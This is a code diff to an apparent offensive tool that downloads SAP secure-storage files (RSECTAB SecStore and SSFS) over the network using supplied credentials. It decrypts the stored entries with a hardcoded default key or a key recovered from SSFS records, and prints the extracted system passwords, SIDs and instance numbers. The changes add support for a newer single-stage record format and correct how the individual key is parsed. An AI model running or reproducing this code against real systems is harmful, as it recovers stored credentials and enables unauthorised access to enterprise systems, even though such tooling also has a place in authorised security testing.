@@ -479,23 +479,26 @@ def decrypt_entry(data_hex: str, key_hex: str = DEFAULT_KEY_HEX) -> dict:
         # Step 1: decrypt with default/supplied key
         data_pass1 = _des3_manual(keydef, data)
 
-        # Step 2: derive per-system keyprime
-        keyprime = _derive_keyprime(keydef, data_pass1)
+        # Check if stage 1 alone produced valid output (VERSION 3 / individual key).
+        # VERSION 3 records have magic "RSEC" at offset 112-115 after just stage 1.
+        magic_check = data_pass1[112:116]
+        if magic_check == b"RSEC":
+            # VERSION 3: single-stage decryption — password is already in data_pass1
+            data_final = data_pass1
+        else:
+            # VERSION 2: two-stage decryption — derive keyprime and decrypt again
+            keyprime = _derive_keyprime(keydef, data_pass1)
+            data_final = _des3_manual(keyprime, data_pass1[:136])
 
-        # Step 3: decrypt first 136 bytes with keyprime
-        data_pass2 = _des3_manual(keyprime, data_pass1[:136])
-
-        # Step 4: parse structure
-        #   data_pass2[0:2]    – prefix (2 bytes)
-        #   data_pass2[2:111]  – password (up to 109 bytes)
-        #   data_pass2[111]    – password length byte
-        #   data_pass2[112:116] – magic local
-        #   data_pass2[116:120] – magic global salted
-        #   data_pass2[120:136] – rec identifier hash
-        #   data_pass1[140:143] – SID
+        # Parse structure (same layout for both versions):
+        #   data_final[0:2]    – prefix (2 bytes)
+        #   data_final[2:111]  – password (up to 109 bytes)
+        #   data_final[111]    – password length byte
+        #   data_final[112:116] – magic "RSEC"
+        #   data_pass1[140:143] – SID  (always from stage 1 output)
         #   data_pass1[143:153] – installation/instance number
-        pass_len    = data_pass2[111]
-        pass_bytes  = data_pass2[2:2 + min(pass_len, 109)]
+        pass_len    = data_final[111]
+        pass_bytes  = data_final[2:2 + min(pass_len, 109)]
         sid         = data_pass1[140:143].rstrip(b"\x00").decode("ascii", errors="replace").strip()
         inst_nr     = data_pass1[143:153].rstrip(b"\x00").decode("ascii", errors="replace").strip()
 
@@ -595,19 +598,26 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
             if ssfs_records:
                 print(f"[+] SecStore {node.sid}: {len(ssfs_records)} records from SSFS DAT")
 
-            # Look for the RSECTAB individual key inside the SSFS records
+            # Look for the RSECTAB individual key inside the SSFS records.
+            # Decrypted record payload structure:
+            #   bytes 0-7:   random prefix
+            #   bytes 8-11:  value length (big-endian)
+            #   bytes 12-27: hash
+            #   bytes 28-31: prefix
+            #   bytes 32+:   value = version_byte(1) + key(24) + trailing
             for ident, data_hex in ssfs_records:
                 if ident.startswith("SECSTORE_DB/KEY/"):
-                    # The decrypted record contains the 24-byte RSECTAB key
-                    # It may have padding/wrapper — try to find 24 usable bytes
                     raw = bytes.fromhex(data_hex)
-                    if len(raw) >= 24:
-                        candidate = raw[:24]
-                        actual_key_hex = candidate.hex()
-                        print(f"[+] SecStore {node.sid}: found RSECTAB individual key "
-                              f"in SSFS record '{ident}'")
-                        if actual_key_hex != DEFAULT_KEY_HEX:
-                            print(f"[+] SecStore {node.sid}: key differs from default")
+                    if len(raw) >= 57:
+                        val_len = int.from_bytes(raw[8:12], "big")
+                        # Value at offset 32: version(1) + key(24) + extra
+                        candidate = raw[33:57]
+                        if len(candidate) == 24:
+                            actual_key_hex = candidate.hex()
+                            print(f"[+] SecStore {node.sid}: found RSECTAB individual key "
+                                  f"in SSFS record '{ident}' (val_len={val_len})")
+                            if actual_key_hex != DEFAULT_KEY_HEX:
+                                print(f"[+] SecStore {node.sid}: key differs from default")
                     break
 
             # The SSFS DAT itself doesn't contain the same records as RSECTAB
